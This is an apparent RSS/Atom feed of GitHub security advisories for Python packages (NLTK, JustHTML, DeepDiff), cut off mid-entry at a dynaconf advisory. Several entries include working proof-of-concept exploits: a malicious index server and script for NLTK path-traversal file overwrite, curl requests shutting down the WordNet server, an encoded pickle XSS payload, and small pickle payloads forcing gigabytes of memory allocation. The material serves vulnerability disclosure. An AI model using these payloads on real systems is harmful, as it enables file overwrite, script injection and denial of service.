<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-03-19T15:13:30.769Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[nltk] NLTK has a Downloader Path Traversal Vulnerability (AFO) - Arbitrary File Overwrite]]></title>
        <id>https://github.com/advisories/GHSA-469j-vmhf-r6v7</id>
        <link href="https://github.com/advisories/GHSA-469j-vmhf-r6v7"/>
        <updated>2026-03-19T12:42:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>The NLTK downloader does not validate the <code>subdir</code> and <code>id</code> attributes when processing remote XML index files. Attackers can control a remote XML index server to provide malicious values containing path traversal sequences (such as <code>../</code>), which can lead to:</p>
<ol>
<li><strong>Arbitrary Directory Creation</strong>: Create directories at arbitrary locations in the file system</li>
<li><strong>Arbitrary File Creation</strong>: Create arbitrary files</li>
<li><strong>Arbitrary File Overwrite</strong>: Overwrite critical system files (such as <code>/etc/passwd</code>, <code>~/.ssh/authorized_keys</code>, etc.)</li>
</ol>
<h2 id="vulnerability-principle">Vulnerability Principle</h2>
<h3 id="key-code-locations">Key Code Locations</h3>
<p><strong>1. XML Parsing Without Validation</strong> (<code>nltk/downloader.py:253</code>)</p>
<pre><code class="language-python">self.filename = os.path.join(subdir, id + ext)
</code></pre>
<ul>
<li><code>subdir</code> and <code>id</code> are directly from XML attributes without any validation</li>
</ul>
<p><strong>2. Path Construction Without Checks</strong> (<code>nltk/downloader.py:679</code>)</p>
<pre><code class="language-python">filepath = os.path.join(download_dir, info.filename)
</code></pre>
<ul>
<li>Directly uses <code>filename</code> which may contain path traversal</li>
</ul>
<p><strong>3. Unrestricted Directory Creation</strong> (<code>nltk/downloader.py:687</code>)</p>
<pre><code class="language-python">os.makedirs(os.path.join(download_dir, info.subdir), exist_ok=True)
</code></pre>
<ul>
<li>Can create arbitrary directories outside the download directory</li>
</ul>
<p><strong>4. File Writing Without Protection</strong> (<code>nltk/downloader.py:695</code>)</p>
<pre><code class="language-python">with open(filepath, "wb") as outfile:
</code></pre>
<ul>
<li>Can write to arbitrary locations in the file system</li>
</ul>
<h3 id="attack-chain">Attack Chain</h3>
<pre><code>1. Attacker controls remote XML index server
   ↓
2. Provides malicious XML: &lt;package id="passwd" subdir="../../etc" .../&gt;
   ↓
3. Victim executes: downloader.download('passwd')
   ↓
4. Package.fromxml() creates object, filename = "../../etc/passwd.zip"
   ↓
5. _download_package() constructs path: download_dir + "../../etc/passwd.zip"
   ↓
6. os.makedirs() creates directory: download_dir + "../../etc"
   ↓
7. open(filepath, "wb") writes file to /etc/passwd.zip
   ↓
8. System file is overwritten!
</code></pre>
<h2 id="impact-scope">Impact Scope</h2>
<ol>
<li><strong>System File Overwrite</strong></li>
</ol>
<h2 id="reproduction-steps">Reproduction Steps</h2>
<h3 id="environment-setup">Environment Setup</h3>
<ol>
<li>Install NLTK</li>
</ol>
<pre><code class="language-bash">pip install nltk
</code></pre>
<ol start="2">
<li>Prepare malicious server and exploit script (see PoC section)</li>
</ol>
<h3 id="reproduction-process">Reproduction Process</h3>
<p><strong>Step 1: Start malicious server</strong></p>
<pre><code class="language-bash">python3 malicious_server.py
</code></pre>
<p><strong>Step 2: Run exploit script</strong></p>
<pre><code class="language-bash">python3 exploit_vulnerability.py
</code></pre>
<p><strong>Step 3: Verify results</strong></p>
<pre><code class="language-bash">ls -la /tmp/test_file.zip
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="malicious-server-malicious_serverpy">Malicious Server (malicious_server.py)</h3>
<pre><code class="language-python">#!/usr/bin/env python3
"""Malicious HTTP Server - Provides XML index with path traversal"""
import os
import tempfile
import zipfile
from http.server import HTTPServer, BaseHTTPRequestHandler

# Create temporary directory
server_dir = tempfile.mkdtemp(prefix="nltk_malicious_")

# Create malicious XML (contains path traversal)
malicious_xml = """&lt;?xml version="1.0"?&gt;
&lt;nltk_data&gt;
  &lt;packages&gt;
    &lt;package id="test_file" subdir="../../../../../../../../../tmp" 
             url="http://127.0.0.1:8888/test.zip" 
             size="100" unzipped_size="100" unzip="0"/&gt;
  &lt;/packages&gt;
&lt;/nltk_data&gt;
"""

# Save files
with open(os.path.join(server_dir, "malicious_index.xml"), "w") as f:
    f.write(malicious_xml)

with zipfile.ZipFile(os.path.join(server_dir, "test.zip"), "w") as zf:
    zf.writestr("test.txt", "Path traversal attack!")

# HTTP Handler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/malicious_index.xml':
            self.send_response(200)
            self.send_header('Content-type', 'application/xml')
            self.end_headers()
            with open(os.path.join(server_dir, 'malicious_index.xml'), 'rb') as f:
                self.wfile.write(f.read())
        elif self.path == '/test.zip':
            self.send_response(200)
            self.send_header('Content-type', 'application/zip')
            self.end_headers()
            with open(os.path.join(server_dir, 'test.zip'), 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

# Start server
if __name__ == "__main__":
    port = 8888
    server = HTTPServer(("0.0.0.0", port), Handler)
    print(f"Malicious server started: http://127.0.0.1:{port}/malicious_index.xml")
    print("Press Ctrl+C to stop")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped")
</code></pre>
<h3 id="exploit-script-exploit_vulnerabilitypy">Exploit Script (exploit_vulnerability.py)</h3>
<pre><code class="language-python">#!/usr/bin/env python3
"""AFO Vulnerability Exploit Script"""
import os
import tempfile

def exploit(server_url="http://127.0.0.1:8888/malicious_index.xml"):
    download_dir = tempfile.mkdtemp(prefix="nltk_exploit_")
    print(f"Download directory: {download_dir}")
    
    # Exploit vulnerability
    from nltk.downloader import Downloader
    downloader = Downloader(server_index_url=server_url, download_dir=download_dir)
    downloader.download("test_file", quiet=True)
    
    # Check results
    expected_path = "/tmp/test_file.zip"
    if os.path.exists(expected_path):
        print(f"\n✗ Exploit successful! File written to: {expected_path}")
        print(f"✗ Path traversal attack successful!")
    else:
        print(f"\n? File not found, download may have failed")

if __name__ == "__main__":
    exploit()
</code></pre>
<h3 id="execution-results">Execution Results</h3>
<pre><code>✗ Exploit successful! File written to: /tmp/test_file.zip
✗ Path traversal attack successful!
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-469j-vmhf-r6v7">https://github.com/nltk/nltk/security/advisories/GHSA-469j-vmhf-r6v7</a></li>
<li><a href="https://github.com/advisories/GHSA-469j-vmhf-r6v7">https://github.com/advisories/GHSA-469j-vmhf-r6v7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-469j-vmhf-r6v7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-19T12:42:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] Unauthenticated remote shutdown in nltk.app.wordnet_app]]></title>
        <id>https://github.com/advisories/GHSA-jm6w-m3j8-898g</id>
        <link href="https://github.com/advisories/GHSA-jm6w-m3j8-898g"/>
        <updated>2026-03-19T12:42:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>nltk.app.wordnet_app</code> allows unauthenticated remote shutdown of the local WordNet Browser HTTP server when it is started in its default mode. A simple <code>GET /SHUTDOWN%20THE%20SERVER</code> request causes the process to terminate immediately via <code>os._exit(0)</code>, resulting in a denial of service.</p>
<h3 id="details">Details</h3>
<p>The vulnerable logic is in <code>nltk/app/wordnet_app.py</code>:</p>
<ul>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L242"><code>nltk/app/wordnet_app.py:242</code></a></p>
<ul>
<li>The server listens on all interfaces:</li>
<li><code>server = HTTPServer(("", port), MyServerHandler)</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L87"><code>nltk/app/wordnet_app.py:87</code></a></p>
<ul>
<li>Incoming requests are checked for the exact path:</li>
<li><code>if unquote_plus(sp) == "SHUTDOWN THE SERVER":</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L88"><code>nltk/app/wordnet_app.py:88</code></a></p>
<ul>
<li>The shutdown protection only depends on <code>server_mode</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L93"><code>nltk/app/wordnet_app.py:93</code></a></p>
<ul>
<li>In the default mode (<code>runBrowser=True</code>, therefore <code>server_mode=False</code>), the handler terminates the process directly:</li>
<li><code>os._exit(0)</code></li>
</ul>
</li>
</ul>
<p>This means any party that can reach the listening port can stop the service with a single unauthenticated GET request when the browser is started in its normal mode.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Start the WordNet Browser in Docker in its default mode:</li>
</ol>
<pre><code class="language-bash">docker run -d --name nltk-wordnet-web-default-retest -p 8004:8004 \
  nltk-sandbox \
  python -c "import nltk; nltk.download('wordnet', quiet=True); from nltk.app.wordnet_app import wnb; wnb(8004, True)"
</code></pre>
<ol start="2">
<li>Confirm the service is reachable:</li>
</ol>
<pre><code class="language-bash">curl -s -o /tmp/wn_before.html -w '%{http_code}\n' 'http://127.0.0.1:8004/'
</code></pre>
<p>Observed result:</p>
<pre><code class="language-text">200
</code></pre>
<ol start="3">
<li>Trigger shutdown:</li>
</ol>
<pre><code class="language-bash">curl -s -o /tmp/wn_shutdown.html -w '%{http_code}\n' 'http://127.0.0.1:8004/SHUTDOWN%20THE%20SERVER'
</code></pre>
<p>Observed result:</p>
<pre><code class="language-text">000
</code></pre>
<ol start="4">
<li>Verify the service is no longer available:</li>
</ol>
<pre><code class="language-bash">curl -s -o /tmp/wn_after.html -w '%{http_code}\n' 'http://127.0.0.1:8004/'
docker ps -a --filter name=nltk-wordnet-web-default-retest --format '{{.Names}}\t{{.Status}}'
docker logs nltk-wordnet-web-default-retest
</code></pre>
<p>Observed results:</p>
<pre><code class="language-text">000
nltk-wordnet-web-default-retest    Exited (0)
Server shutting down!
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an unauthenticated denial-of-service issue in the NLTK WordNet Browser HTTP server.</p>
<p>Any reachable client can terminate the service remotely when the application is started in its default mode. The impact is limited to service availability, but it is still security-relevant because:</p>
<ul>
<li>the route is accessible over HTTP</li>
<li>no authentication or CSRF-style confirmation is required</li>
<li>the server listens on all interfaces by default</li>
<li>the process exits immediately instead of performing a controlled shutdown</li>
</ul>
<p>This primarily affects users who run <code>nltk.app.wordnet_app</code> and expose or otherwise allow access to its listening port.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-jm6w-m3j8-898g">https://github.com/nltk/nltk/security/advisories/GHSA-jm6w-m3j8-898g</a></li>
<li><a href="https://github.com/advisories/GHSA-jm6w-m3j8-898g">https://github.com/advisories/GHSA-jm6w-m3j8-898g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jm6w-m3j8-898g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-19T12:42:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') in nltk]]></title>
        <id>https://github.com/advisories/GHSA-gfwx-w7gr-fvh7</id>
        <link href="https://github.com/advisories/GHSA-gfwx-w7gr-fvh7"/>
        <updated>2026-03-19T06:51:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>nltk.app.wordnet_app</code> contains a reflected cross-site scripting issue in the <code>lookup_...</code> route. A crafted <code>lookup_&lt;payload&gt;</code> URL can inject arbitrary HTML/JavaScript into the response page because attacker-controlled <code>word</code> data is reflected into HTML without escaping. This impacts users running the local WordNet Browser server and can lead to script execution in the browser origin of that application.</p>
<h3 id="details">Details</h3>
<p>The vulnerable flow is in <code>nltk/app/wordnet_app.py</code>:</p>
<ul>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L144"><code>nltk/app/wordnet_app.py:144</code></a></p>
<ul>
<li>Requests starting with <code>lookup_</code> are handled as HTML responses:</li>
<li><code>page, word = page_from_href(sp)</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L755"><code>nltk/app/wordnet_app.py:755</code></a></p>
<ul>
<li><code>page_from_href()</code> calls <code>page_from_reference(Reference.decode(href))</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L769"><code>nltk/app/wordnet_app.py:769</code></a></p>
<ul>
<li><code>word = href.word</code></li>
</ul>
</li>
<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L796"><code>nltk/app/wordnet_app.py:796</code></a></p>
<ul>
<li>If no results are found, <code>word</code> is inserted directly into the HTML body:</li>
<li><code>body = "The word or words '%s' were not found in the dictionary." % word</code></li>
</ul>
</li>
</ul>
<p>This is inconsistent with the <code>search</code> route, which does escape user input:</p>
<ul>
<li><a href="/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L136"><code>nltk/app/wordnet_app.py:136</code></a><ul>
<li><code>word = html.escape(...)</code></li>
</ul>
</li>
</ul>
<p>As a result, a malicious <code>lookup_...</code> payload can inject script into the response page.</p>
<p>The issue is exploitable because:</p>
<ul>
<li><code>Reference.decode()</code> accepts attacker-controlled base64-encoded pickle data for the URL state.</li>
<li>The decoded <code>word</code> is reflected into HTML without <code>html.escape()</code>.</li>
<li>The server is started with <code>HTTPServer(("", port), MyServerHandler)</code>, so it listens on all interfaces by default, not just <code>localhost</code>.</li>
</ul>
<h3 id="poc">PoC</h3>
<ol>
<li>Start the WordNet Browser in an isolated Docker environment:</li>
</ol>
<pre><code class="language-bash">docker run -d --name nltk-wordnet-web -p 8002:8002 \
  nltk-sandbox \
  python -c "import nltk; nltk.download('wordnet', quiet=True); from nltk.app.wordnet_app import wnb; wnb(8002, False)"
</code></pre>
<ol start="2">
<li>Use the following crafted payload, which decodes to:</li>
</ol>
<pre><code class="language-python">("&lt;script&gt;alert(1)&lt;/script&gt;", {})
</code></pre>
<p>Encoded payload:</p>
<pre><code class="language-text">gAWVIQAAAAAAAACMGTxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD6UfZSGlC4=
</code></pre>
<ol start="3">
<li>Request the vulnerable route:</li>
</ol>
<pre><code class="language-bash">curl -s "http://127.0.0.1:8002/lookup_gAWVIQAAAAAAAACMGTxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD6UfZSGlC4="
</code></pre>
<ol start="4">
<li>Observed result:</li>
</ol>
<pre><code class="language-text">The word or words '&lt;script&gt;alert(1)&lt;/script&gt;' were not found in the dictionary.
</code></pre>
<img width="867" height="208" alt="127" src="https://github.com/user-attachments/assets/ec09da08-09bc-4fc4-bfc1-c4489e9adaf6">


<p>I also validated the issue directly at function level in Docker:</p>
<pre><code class="language-python">import base64
import pickle

from nltk.app.wordnet_app import page_from_href

payload = base64.urlsafe_b64encode(
    pickle.dumps(("&lt;script&gt;alert(1)&lt;/script&gt;", {}), -1)
).decode()

page, word = page_from_href(payload)
print(word)
print("&lt;script&gt;alert(1)&lt;/script&gt;" in page)
</code></pre>
<p>Observed output:</p>
<pre><code class="language-text">WORD= &lt;script&gt;alert(1)&lt;/script&gt;
HAS_SCRIPT= True
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a reflected XSS issue in the NLTK WordNet Browser web UI.</p>
<p>An attacker who can convince a user to open a crafted <code>lookup_...</code> URL can execute arbitrary JavaScript in the origin of the local WordNet Browser application. This can be used to:</p>
<ul>
<li>run arbitrary script in the browser tab</li>
<li>manipulate the page content shown to the user</li>
<li>issue same-origin requests to other WordNet Browser routes</li>
<li>potentially trigger available UI actions in that local app context</li>
</ul>
<p>This primarily impacts users who run <code>nltk.app.wordnet_app</code> as a local or self-hosted HTTP service and open attacker-controlled links.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-gfwx-w7gr-fvh7">https://github.com/nltk/nltk/security/advisories/GHSA-gfwx-w7gr-fvh7</a></li>
<li><a href="https://github.com/nltk/nltk/commit/1c3f799607eeb088cab2491dcf806ae83c29ad8f">https://github.com/nltk/nltk/commit/1c3f799607eeb088cab2491dcf806ae83c29ad8f</a></li>
<li><a href="https://github.com/advisories/GHSA-gfwx-w7gr-fvh7">https://github.com/advisories/GHSA-gfwx-w7gr-fvh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gfwx-w7gr-fvh7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-18T20:23:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[justhtml] JustHTML has a Sanitizer Bypass (in Markdown)]]></title>
        <id>https://github.com/advisories/GHSA-3rcm-vjrc-p45j</id>
        <link href="https://github.com/advisories/GHSA-3rcm-vjrc-p45j"/>
        <updated>2026-03-18T20:19:56.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>to_markdown()</code> does not sufficiently escape text content that looks like HTML. As a result, untrusted input that is safe in <code>to_html()</code> can become raw HTML in Markdown output.</p>
<p>This is not specific to tokenizer raw-text states like <code>&lt;title&gt;</code>, <code>&lt;noscript&gt;</code>, or <code>&lt;plaintext&gt;</code>, although those states can trigger the behavior. The root cause is broader: Markdown text serialization leaves angle brackets unescaped in text nodes.</p>
<h2 id="details">Details</h2>
<p>When converting a parsed document to Markdown, text nodes are escaped for a small set of Markdown metacharacters, but HTML-significant characters such as <code>&lt;</code> and <code>&gt;</code> are preserved. That means content parsed as text, including entity-decoded text or text produced by RCDATA/RAWTEXT-style parsing, can be emitted into Markdown as raw HTML.</p>
<p>Examples of affected input include:</p>
<ul>
<li>Text produced from entity-decoded input such as <code>&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;</code></li>
<li>Text inside elements like <code>&lt;title&gt;</code>, <code>&lt;textarea&gt;</code>, <code>&lt;noscript&gt;</code> (when parsed as raw text), and <code>&lt;plaintext&gt;</code></li>
</ul>
<p>This is distinct from actual <code>&lt;script&gt;</code> or <code>&lt;style&gt;</code> elements in the DOM. Those are already dropped by default in <code>to_markdown()</code> unless <code>html_passthrough=True</code>.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="general-case">General case</h3>
<pre><code class="language-python">from justhtml import JustHTML

doc = JustHTML("&lt;p&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/p&gt;", fragment=True)

print(doc.to_html())
print()
print(doc.to_markdown())
### References

- &lt;https://github.com/EmilStenstrom/justhtml/security/advisories/GHSA-3rcm-vjrc-p45j&gt;
- &lt;https://github.com/advisories/GHSA-3rcm-vjrc-p45j&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3rcm-vjrc-p45j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-18T20:19:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[justhtml] JustHTML Affected by Mutation XSS via Literal Text Serialization in Raw Text Elements (style/script)]]></title>
        <id>https://github.com/advisories/GHSA-qvc2-mg72-jjhx</id>
        <link href="https://github.com/advisories/GHSA-qvc2-mg72-jjhx"/>
        <updated>2026-03-18T20:19:48.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Sanitized DOM trees can be unsafe to serialize when a custom policy allows raw-text elements such as <code>&lt;style&gt;</code> or <code>&lt;script&gt;</code>.</p>
<p>The issue affects DOM trees that are constructed or modified programmatically and then passed through <code>sanitize_dom()</code> with a policy that keeps these elements. Text nodes inside <code>&lt;style&gt;</code> and <code>&lt;script&gt;</code> are serialized literally, so attacker-controlled text containing the matching closing tag sequence can break out of the raw-text context and inject HTML into the serialized output.</p>
<p>The default sanitization policy is not affected because it drops the contents of <code>style</code> and <code>script</code>.</p>
<h2 id="details">Details</h2>
<p>The root cause is in HTML serialization of raw-text elements. In serialize.py, text children of <code>script</code> and <code>style</code> are emitted verbatim:</p>
<pre><code class="language-python">_LITERAL_TEXT_SERIALIZATION_ELEMENTS = frozenset({"script", "style"})

def _serialize_text_for_parent(text: str | None, parent_name: str | None) -&gt; str:
    if not text:
        return ""
    if parent_name in _LITERAL_TEXT_SERIALIZATION_ELEMENTS:
        return text
    return _escape_text(text)
### References

- &lt;https://github.com/EmilStenstrom/justhtml/security/advisories/GHSA-qvc2-mg72-jjhx&gt;
- &lt;https://github.com/advisories/GHSA-qvc2-mg72-jjhx&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qvc2-mg72-jjhx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-18T20:19:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] Natural Language Toolkit (NLTK) has unbounded recursion in JSONTaggedDecoder.decode_obj() may cause DoS]]></title>
        <id>https://github.com/advisories/GHSA-rf74-v2fm-23pw</id>
        <link href="https://github.com/advisories/GHSA-rf74-v2fm-23pw"/>
        <updated>2026-03-18T20:17:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>JSONTaggedDecoder.decode_obj()</code> in <code>nltk/jsontags.py</code> calls itself 
recursively without any depth limit. A deeply nested JSON structure 
exceeding <code>sys.getrecursionlimit()</code> (default: 1000) will raise an 
unhandled <code>RecursionError</code>, crashing the Python process.</p>
<h3 id="affected-code">Affected code</h3>
<p>File: <code>nltk/jsontags.py</code>, lines 47–52</p>
<pre><code class="language-python">@classmethod
def decode_obj(cls, obj):
    if isinstance(obj, dict):
        obj = {key: cls.decode_obj(val) for (key, val) in obj.items()}
    elif isinstance(obj, list):
        obj = list(cls.decode_obj(val) for val in obj)
</code></pre>
<h3 id="proof-of-concept">Proof of Concept</h3>
<pre><code class="language-python">import sys, json
from nltk.jsontags import JSONTaggedDecoder

depth = sys.getrecursionlimit() + 50  # e.g. 1050
payload = '{"x":' * depth + "null" + "}" * depth

# Raises RecursionError, crashing the process
json.loads(payload, cls=JSONTaggedDecoder)
</code></pre>
<h3 id="impact">Impact</h3>
<p>Any code path that passes externally-supplied JSON to 
<code>JSONTaggedDecoder</code> is vulnerable to denial of service.
The severity depends on whether such a path exists in the 
calling code (e.g. <code>nltk/data.py</code>).</p>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Add a depth parameter with a hard limit:</p>
<pre><code class="language-python">@classmethod
def decode_obj(cls, obj, _depth=0):
    if _depth &gt; 100:
        raise ValueError("JSON nesting too deep")
    if isinstance(obj, dict):
        obj = {key: cls.decode_obj(val, _depth + 1) 
               for (key, val) in obj.items()}
    elif isinstance(obj, list):
        obj = list(cls.decode_obj(val, _depth + 1) for val in obj)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-rf74-v2fm-23pw">https://github.com/nltk/nltk/security/advisories/GHSA-rf74-v2fm-23pw</a></li>
<li><a href="https://github.com/advisories/GHSA-rf74-v2fm-23pw">https://github.com/advisories/GHSA-rf74-v2fm-23pw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rf74-v2fm-23pw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-18T20:17:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deepdiff] DeepDiff has Memory Exhaustion DoS through SAFE_TO_IMPORT]]></title>
        <id>https://github.com/advisories/GHSA-54jj-px8x-5w5q</id>
        <link href="https://github.com/advisories/GHSA-54jj-px8x-5w5q"/>
        <updated>2026-03-18T20:10:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The pickle unpickler <code>_RestrictedUnpickler</code> validates which classes can be loaded but does not limit their constructor arguments. A few of the types in <code>SAFE_TO_IMPORT</code> have constructors that allocate memory proportional to their input (<code>builtins.bytes</code>, <code>builtins.list</code>, <code>builtins.range</code>). A 40-byte pickle payload can force 10+ GB of memory, which crashes applications that load delta objects or call <code>pickle_load</code> with untrusted data.</p>
<h3 id="details">Details</h3>
<p>CVE-2025-58367 hardened the delta class against pollution and remote code execution by converting <code>SAFE_TO_IMPORT</code> to a <code>frozenset</code> and blocking traversal. <code>_RestrictedUnpickler.find_class</code> only gates which classes can be loaded. It doesn't intercept <code>REDUCE</code> opcodes or validate what is passed to constructors.</p>
<p>It can be exploited in 2 ways.</p>
<p><strong>1 - During <code>pickle_load</code></strong></p>
<p>A pickle that calls <code>bytes(N)</code> using opcodes permitted by the allowlist. The allocation happens during deserialization and before the delta processes anything. The restricted unpickler does not override <code>load_reduce</code> so any allowed class can be called.</p>
<pre><code>GLOBAL builtins.bytes      (passes find_class check — serialization.py:353)
INT    10000000000          (10 billion)
TUPLE + REDUCE             → bytes(10**10) → allocates ~9.3 GB
</code></pre>
<p><strong>2 - During delta application</strong></p>
<p>A valid diff dict that first sets a value to a large int via <code>values_changed</code>, then converts it to bytes via <code>type_changes</code>. It works because <code>_do_values_changed()</code> runs before <code>_do_type_changes()</code> in <code>Delta.add()</code> in <code>delta.py</code> line 183. Step 1 modifies the target in place before step 2 reads the modified value and calls <code>new_type(current_old_value)</code> at <code>delta.py</code> line 576 with no size guard.</p>
<h3 id="poc">PoC</h3>
<p>The script uses Python's <code>resource</code> module to cap memory to 1 GB so you can reproduce safely without hitting the OOM killer. It loads deepdiff first, applies the limit, then runs the payload. Change <code>10**8</code> to <code>10**10</code> for the full 9.3 GB allocation.</p>
<pre><code class="language-python">import resource
import sys

def limit_memory(maxsize_mb):
    """Cap virtual memory for this process."""
    soft, hard = resource.getrlimit(resource.RLIMIT_AS)
    maxsize_bytes = maxsize_mb * 1024 * 1024
    try:
        resource.setrlimit(resource.RLIMIT_AS, (maxsize_bytes, hard))
        print(f"[*] Memory limit set to {maxsize_mb} MB")
    except ValueError:
        print("[!] Failed to set memory limit.")
        sys.exit(1)

# Load heavy imports before enforcing the limit
from deepdiff import Delta
from deepdiff.serialization import pickle_dump, pickle_load

limit_memory(1024)

# --- Delta application path ---
payload_dict = {
    'values_changed': {"root['x']": {'new_value': 10**8}},
    'type_changes': {"root['x']": {'new_type': bytes}},
}

payload1 = pickle_dump(payload_dict)
print(f"Payload size: {len(payload1)} bytes")

target = {'x': 'anything'}
try:
    result = target + Delta(payload1)
    print(f"Allocated: {len(result['x']) // 1024 // 1024} MB")
    print(f"Amplification: {len(result['x']) // len(payload1)}x")
except MemoryError:
    print("[!] MemoryError — payload tried to allocate too much")

# --- Raw pickle path ---
payload2 = (
    b"(dp0\n"
    b"S'_'\n"
    b"cbuiltins\nbytes\n"
    b"(I100000000\n"
    b"tR"
    b"s."
)

print(f"Payload size: {len(payload2)} bytes")
try:
    result2 = pickle_load(payload2)
    print(f"Allocated: {len(result2['_']) // 1024 // 1024} MB")
except MemoryError:
    print("[!] MemoryError — payload tried to allocate too much")
</code></pre>
<p>Output:</p>
<pre><code>[*] Memory limit set to 1024 MB
Payload size: 123 bytes
Allocated: 95 MB
Amplification: 813008x
Payload size: 42 bytes
Allocated: 95 MB
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of service. Any application that deserializes delta objects or calls <code>pickle_load</code> with untrusted inputs can be crashed with a small payload. The restricted unpickler is meant to make this safe. It prevents remote code execution but doesn't prevent resource exhaustion.</p>
<p>The amplification is large. 800,000x for delta and 2,000,000x for raw pickle.</p>
<p>Impacted users are anyone who accepts serialized delta objects from untrusted sources — network APIs, file uploads, message queues, etc.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/seperman/deepdiff/security/advisories/GHSA-54jj-px8x-5w5q">https://github.com/seperman/deepdiff/security/advisories/GHSA-54jj-px8x-5w5q</a></li>
<li><a href="https://github.com/seperman/deepdiff/commit/0d07ec21d12b46ef4e489383b363eadc22d990fb">https://github.com/seperman/deepdiff/commit/0d07ec21d12b46ef4e489383b363eadc22d990fb</a></li>
<li><a href="https://github.com/advisories/GHSA-54jj-px8x-5w5q">https://github.com/advisories/GHSA-54jj-px8x-5w5q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-54jj-px8x-5w5q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-18T20:10:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dynaconf] dynaconf Affected by Remote Code Execution (RCE) via Insecure Template Evaluation in @jinja Resolver]]></title>
        <id>https://github.com/advisories/GHSA-pxrr-hq57-q35p</id>
        <link href="https://github.com/advisories/GHSA-pxrr-hq57-q35p"/>
